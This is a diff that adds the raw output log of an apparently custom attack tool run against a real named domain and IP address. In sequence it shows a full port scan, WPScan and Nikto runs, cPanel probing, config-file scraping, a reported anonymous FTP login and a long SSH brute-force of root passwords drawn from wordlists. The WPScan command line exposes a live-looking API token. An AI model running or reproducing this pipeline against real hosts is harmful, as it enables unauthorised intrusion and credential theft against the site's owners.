@@ -1,0 +1,312 @@
+DEBUG: main() started
+===== DNS RESOLUTION =====
+[DNS] pschile.cl → 162.241.218.115
+
+[SCAN] pschile.cl (162.241.218.115) — FULL (1-65535)
+[DEBUG] Scanning 65535 ports with 25 workers...
+  [HIGH] Port 21 (FTP) — OPEN
+  [LOW] Port 22 (SSH) — OPEN
+  [LOW] Port 25 (SMTP) — OPEN
+  [LOW] Port 26 (SMTP-Alt) — OPEN
+  [LOW] Port 53 (DNS) — OPEN
+  [LOW] Port 80 (HTTP) — OPEN
+  [LOW] Port 110 (POP3) — OPEN
+  [LOW] Port 443 (HTTPS) — OPEN
+  [LOW] Port 465 (Unknown) — OPEN
+  [LOW] Port 587 (Unknown) — OPEN
+  [LOW] Port 993 (Unknown) — OPEN
+  [LOW] Port 995 (Unknown) — OPEN
+  [LOW] Port 2078 (WebDAV-SSL) — OPEN
+  [LOW] Port 2077 (WebDAV) — OPEN
+  [HIGH] Port 2083 (cPanel) — OPEN
+  [LOW] Port 2082 (cPanel-HTTP) — OPEN
+  [LOW] Port 2096 (Webmail-HTTPS) — OPEN
+  [LOW] Port 2087 (WHM-HTTPS) — OPEN
+  [LOW] Port 2095 (Webmail-HTTP) — OPEN
+  [HIGH] Port 2222 (SSH) — OPEN
+  [HIGH] Port 3306 (MySQL) — OPEN
+  [HIGH] Port 5432 (PostgreSQL) — OPEN
+[DEBUG] Done. Open ports: 22
+
+===== SCAN SUMMARY =====
+
+[pschiel] pschile.cl (162.241.218.115)
+  Port    21 (FTP            ) — HIGH
+  Port    22 (SSH            ) — LOW
+  Port    25 (SMTP           ) — LOW
+  Port    26 (SMTP-Alt       ) — LOW
+  Port    53 (DNS            ) — LOW
+  Port    80 (HTTP           ) — LOW
+  Port   110 (POP3           ) — LOW
+  Port   443 (HTTPS          ) — LOW
+  Port   465 (Unknown        ) — LOW
+  Port   587 (Unknown        ) — LOW
+  Port   993 (Unknown        ) — LOW
+  Port   995 (Unknown        ) — LOW
+  Port  2077 (WebDAV         ) — LOW
+  Port  2078 (WebDAV-SSL     ) — LOW
+  Port  2082 (cPanel-HTTP    ) — LOW
+  Port  2083 (cPanel         ) — HIGH
+  Port  2087 (WHM-HTTPS      ) — LOW
+  Port  2095 (Webmail-HTTP   ) — LOW
+  Port  2096 (Webmail-HTTPS  ) — LOW
+  Port  2222 (SSH            ) — HIGH
+  Port  3306 (MySQL          ) — HIGH
+  Port  5432 (PostgreSQL     ) — HIGH
+
+[EXPORT] Results saved to reports/results.json
+[EXPORT] Results appended to reports/results.csv
+
+[ROUTER] Checking extractors for pschile.cl (162.241.218.115)
+  [CDN] pschile.cl is not behind Cloudflare — skipping bypass
+
+  [WPScan] Targeting https://www.pschile.cl
+  [WPScan] Running: wpscan --url https://www.pschile.cl --format json --no-update --disable-tls-checks --ignore-main-redirect --enumerate u,p,t --api-token nL5IQBV8aZTVXP4hXdEZWAUrhkSG0axd2foMGUc4SNs
+  [WPScan] Timed out after 120s
+
+  [Nikto] Targeting www.pschile.cl:443
+  [Nikto] Running: nikto -host www.pschile.cl -port 443 -Format csv -nointeractive -timeout 10 -ssl
+  [Nikto] Scan complete — 0 findings (0 HIGH, 0 MEDIUM, 0 INFO)
+
+  [cPanel] Targeting pschile.cl:2083
+  [cPanel] Could not reach login page
+
+  [cPanel] Targeting pschile.cl:2087
+  [cPanel] Could not reach login page
+  [CONFIG] Starting...
+Exception (client): Error reading SSH protocol banner
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2363, in _check_banner
+    buf = self.packetizer.readline(timeout)
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 395, in readline
+    buf += self._read_timeout(timeout)
+           ~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 673, in _read_timeout
+    raise socket.timeout()
+TimeoutError
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2179, in run
+    self._check_banner()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2367, in _check_banner
+    raise SSHException(
+        "Error reading SSH protocol banner" + str(e)
+    )
+paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+
+Exception (client): Error reading SSH protocol banner[Errno 104] Connection reset by peer
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2363, in _check_banner
+    buf = self.packetizer.readline(timeout)
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 395, in readline
+    buf += self._read_timeout(timeout)
+           ~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 663, in _read_timeout
+    x = self.__socket.recv(128)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2179, in run
+    self._check_banner()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2367, in _check_banner
+    raise SSHException(
+        "Error reading SSH protocol banner" + str(e)
+    )
+paramiko.ssh_exception.SSHException: Error reading SSH protocol banner[Errno 104] Connection reset by peer
+
+Exception (client): Error reading SSH protocol banner
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2363, in _check_banner
+    buf = self.packetizer.readline(timeout)
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 395, in readline
+    buf += self._read_timeout(timeout)
+           ~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/packet.py", line 665, in _read_timeout
+    raise EOFError()
+EOFError
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2179, in run
+    self._check_banner()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/home/felipe/.local/lib/python3.13/site-packages/paramiko/transport.py", line 2367, in _check_banner
+    raise SSHException(
+        "Error reading SSH protocol banner" + str(e)
+    )
+paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+
+
+  [CONFIG] Scraping config files on www.pschile.cl
+  [CONFIG] No exposed config files found
+  [MATCH] Port 21 (FTP) — launching extractor
+  [FTP] Connecting to 162.241.218.115:21
+  [FTP] Banner: 220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 3 of 150 allowed.
+220-Local time is now 07:03. Server port: 21.
+220 You will be disconnected after 15 minutes of inactivity.
+  [FTP] CRITICAL — anonymous login succeeded
+  [MATCH] Port 22 (SSH) — launching extractor
+  [SSH] Connecting to 162.241.218.115:22
+  [SSH] Version: SSH-2.0-OpenSSH_8.7
+  [SSH] Loaded 3 entries from user-10-million-usernames-dup.txt
+  [SSH] Loaded 716 entries from pass-10-million-passwords-1000000.txt
+  [SSH] Testing 2148 combinations...
+  [SSH] Invalid: root:root
+  [SSH] Invalid: root:admin
+  [SSH] Invalid: root:1234
+  [SSH] Invalid: root:user
+  [SSH] Invalid: root:Administrator
+  [SSH] Invalid: root:administrador
+  [SSH] Invalid: root:usuario2
+  [SSH] Error testing root:usuario: No existing session
+  [SSH] Invalid: root:user4
+  [SSH] Invalid: root:user3
+  [SSH] Invalid: root:user2
+  [SSH] Invalid: root:user1
+  [SSH] Invalid: root:12345
+  [SSH] Invalid: root:123456
+  [SSH] Invalid: root:daemon
+  [SSH] Invalid: root:bin
+  [SSH] Invalid: root:sys
+  [SSH] Error testing root:sync: Error reading SSH protocol banner[Errno 104] Connection reset by peer
+  [SSH] Error testing root:games: Error reading SSH protocol banner
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:man: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:lp: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:mail: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:news: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:uucp: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:proxy: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:www-data: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:backup: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:nobody: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:a: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:welcome123: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:welcome: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:webmaster: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:webadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:vision: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:valentin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:uuidd: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:uploader: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:unknown: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:ubuntu: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:ubnt: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:trustno1: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:toor: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:tomcat: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:thomas: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:testtest: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:test123: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:test: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:temptemp: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:temporary: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:temporal: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:temp123: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:tang: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:systemadministrator: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:systemadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:system32: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:system: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sysadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sys: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sybase: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:support: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:supervisor: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:superuser: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:supernic.cn: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:superadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:super: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sunshine: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sudo: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:student: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:start123: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sshd: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:soporte: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:soadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:siadmin: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:shisp.com: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:shirley: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:share: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:shangdi: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:shadow: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:server: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:security: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:secure: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:secret: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:samsung: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:sample: no_connection
+  [SSH] Rate limited — waiting 10s before retry...
+  [SSH] Error testing root:s123456: no_connection
